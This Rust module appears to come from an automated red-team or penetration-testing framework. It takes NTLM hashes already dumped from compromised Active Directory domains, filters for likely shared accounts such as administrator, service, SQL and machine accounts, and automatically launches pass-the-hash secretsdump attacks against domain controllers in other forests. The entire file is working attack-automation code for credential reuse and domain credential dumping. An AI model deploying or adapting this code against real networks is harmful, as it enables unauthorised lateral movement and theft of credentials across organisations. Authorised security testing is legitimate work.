//! auto_credential_reuse -- cross-domain hash reuse after NTDS dumps.
//!
//! After any secretsdump extracts NTLM hashes, tries those hashes against DCs
//! in OTHER domains. Catches the common pattern where service accounts or
//! built-in accounts (e.g. `localuser`) share passwords across domains/forests.
//!
//! This is distinct from `auto_local_admin_secretsdump` which only targets
//! same-domain and parent-domain DCs.

use std::sync::Arc;
use std::time::Duration;

use tokio::sync::watch;
use tracing::{debug, info, warn};

use crate::orchestrator::dispatcher::Dispatcher;

/// Dedup key namespace for cross-domain reuse attempts.
const DEDUP_CROSS_REUSE: &str = "cross_reuse";

/// Cross-domain credential reuse automation.
/// Interval: 30s. Tries hashes from dominated domains against other forests' DCs.
pub async fn auto_credential_reuse(
    dispatcher: Arc<Dispatcher>,
    mut shutdown: watch::Receiver<bool>,
) {
    let mut interval = tokio::time::interval(Duration::from_secs(30));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    // Wait for initial recon to populate state
    tokio::time::sleep(Duration::from_secs(60)).await;

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        // Only fire if the technique is allowed
        if !dispatcher.is_technique_allowed("credential_reuse") {
            continue;
        }

        // Collect cross-domain reuse candidates:
        // For each NTLM hash extracted from a dominated domain, try it against
        // DCs in domains that are NOT in the same forest as the source domain.
        let work: Vec<(String, String, String, String, String)> = {
            let state = dispatcher.state.read().await;

            // Need at least 2 known DCs (implies multiple domains)
            if state.domain_controllers.len() < 2 {
                continue;
            }

            let mut items = Vec::new();

            // Target high-value accounts for cross-domain reuse
            let reuse_candidates: Vec<_> = state
                .hashes
                .iter()
                .filter(|h| h.hash_type.to_uppercase() == "NTLM")
                .filter(|h| !h.hash_value.is_empty())
                // Focus on accounts likely to be shared across domains
                .filter(|h| {
                    let u = h.username.to_lowercase();
                    u == "administrator"
                        || u == "localuser"
                        || u.contains("svc")
                        || u.contains("admin")
                        || u.contains("sql")
                        || h.username == h.username.to_uppercase() // Machine accounts
                })
                .collect();

            for hash in &reuse_candidates {
                let hash_domain = hash.domain.to_lowercase();

                for (dc_domain, dc_ip) in &state.domain_controllers {
                    let target_domain = dc_domain.to_lowercase();

                    // Skip same domain and parent/child domains (handled by secretsdump.rs)
                    if target_domain == hash_domain
                        || target_domain.ends_with(&format!(".{hash_domain}"))
                        || hash_domain.ends_with(&format!(".{target_domain}"))
                    {
                        continue;
                    }

                    let dedup = format!(
                        "{}:{}:{}:{}",
                        dc_ip,
                        target_domain,
                        hash.username.to_lowercase(),
                        &hash.hash_value[..16.min(hash.hash_value.len())]
                    );
                    if !state.is_processed(DEDUP_CROSS_REUSE, &dedup) {
                        items.push((
                            dedup,
                            dc_ip.clone(),
                            hash.username.clone(),
                            hash.domain.clone(),
                            hash.hash_value.clone(),
                        ));
                    }
                }
            }

            items
        };

        if work.is_empty() {
            continue;
        }

        // Limit to 3 per cycle to avoid flooding
        for (dedup_key, dc_ip, username, source_domain, hash_value) in work.into_iter().take(3) {
            debug!(
                dc = %dc_ip,
                username = %username,
                source_domain = %source_domain,
                "Attempting cross-domain hash reuse"
            );

            let priority = dispatcher.effective_priority("credential_reuse");
            match dispatcher
                .request_secretsdump_hash(&dc_ip, &username, &source_domain, &hash_value, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        dc = %dc_ip,
                        username = %username,
                        source_domain = %source_domain,
                        "Cross-domain hash reuse secretsdump dispatched"
                    );
                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_CROSS_REUSE, dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_CROSS_REUSE, &dedup_key)
                        .await;
                }
                Ok(None) => {
                    debug!("Cross-domain reuse deferred by throttler");
                }
                Err(e) => warn!(err = %e, "Failed to dispatch cross-domain reuse"),
            }
        }
    }
}
